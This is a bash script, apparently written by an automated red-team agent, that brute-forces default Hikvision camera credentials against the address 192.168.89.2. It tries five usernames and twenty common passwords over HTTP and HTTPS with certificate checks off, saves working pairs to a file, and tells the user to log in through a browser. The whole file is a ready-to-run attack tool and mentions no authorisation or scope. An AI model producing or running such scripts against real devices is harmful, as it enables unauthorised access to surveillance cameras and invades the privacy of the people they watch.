#!/bin/bash

# Script to try common Hikvision credentials
# Created by NeuroStrike Red Agent

echo "Hikvision Credential Tester"
echo "==========================="
echo ""
echo "This script will try common Hikvision default credentials"
echo ""

# Define the target
TARGET="192.168.89.2"

# Define common Hikvision credentials
declare -a usernames=("admin" "root" "user" "operator" "guest")
declare -a passwords=(
    "12345" 
    "admin" 
    "123456" 
    "" 
    "888888" 
    "666666" 
    "password" 
    "123" 
    "1234" 
    "hikvision" 
    "Hikvision" 
    "HIKVISION" 
    "hikadmin" 
    "hik12345" 
    "Admin12345" 
    "Hikvision@123" 
    "Hikvision123" 
    "Hikvision@2023" 
    "Hikvision@2024" 
    "Hikvision@2025"
)

# Function to test HTTP credentials
test_http_credentials() {
    local username=$1
    local password=$2
    
    # Use curl to test credentials
    status_code=$(curl -s -o /dev/null -w "%{http_code}" -u "${username}:${password}" "http://${TARGET}/")
    
    if [ "$status_code" = "200" ]; then
        echo "SUCCESS: Credentials work for HTTP: ${username} / ${password}"
        return 0
    else
        echo "FAILED: Credentials don't work for HTTP: ${username} / ${password} (Status: ${status_code})"
        return 1
    fi
}

# Function to test HTTPS credentials
test_https_credentials() {
    local username=$1
    local password=$2
    
    # Use curl to test credentials (ignore SSL verification)
    status_code=$(curl -s -o /dev/null -w "%{http_code}" -k -u "${username}:${password}" "https://${TARGET}/")
    
    if [ "$status_code" = "200" ]; then
        echo "SUCCESS: Credentials work for HTTPS: ${username} / ${password}"
        return 0
    else
        echo "FAILED: Credentials don't work for HTTPS: ${username} / ${password} (Status: ${status_code})"
        return 1
    fi
}

# Test connectivity first
echo "Testing connectivity to ${TARGET}..."
if ping -c 1 ${TARGET} &> /dev/null; then
    echo "Target is reachable."
else
    echo "ERROR: Target is not reachable. Please check your network connection."
    exit 1
fi

# Try each combination of credentials
echo ""
echo "Testing credentials..."
echo ""

for username in "${usernames[@]}"; do
    for password in "${passwords[@]}"; do
        # Test HTTP
        if test_http_credentials "$username" "$password"; then
            # If HTTP works, also test HTTPS
            test_https_credentials "$username" "$password"
            
            # Save successful credentials to a file
            echo "${username}:${password}" >> successful_credentials.txt
            
            echo ""
            echo "Found working credentials: ${username} / ${password}"
            echo "These have been saved to successful_credentials.txt"
            echo ""
            echo "Try these in your web browser at:"
            echo "http://${TARGET}/"
            echo "or"
            echo "https://${TARGET}/"
            echo ""
            
            # Ask if user wants to continue testing
            read -p "Continue testing more credentials? (y/n): " continue_testing
            if [[ "$continue_testing" != "y" && "$continue_testing" != "Y" ]]; then
                echo "Exiting..."
                exit 0
            fi
        fi
    done
done

echo ""
echo "All credential combinations tested."
echo "If no successful credentials were found, try using a more comprehensive list."
echo ""
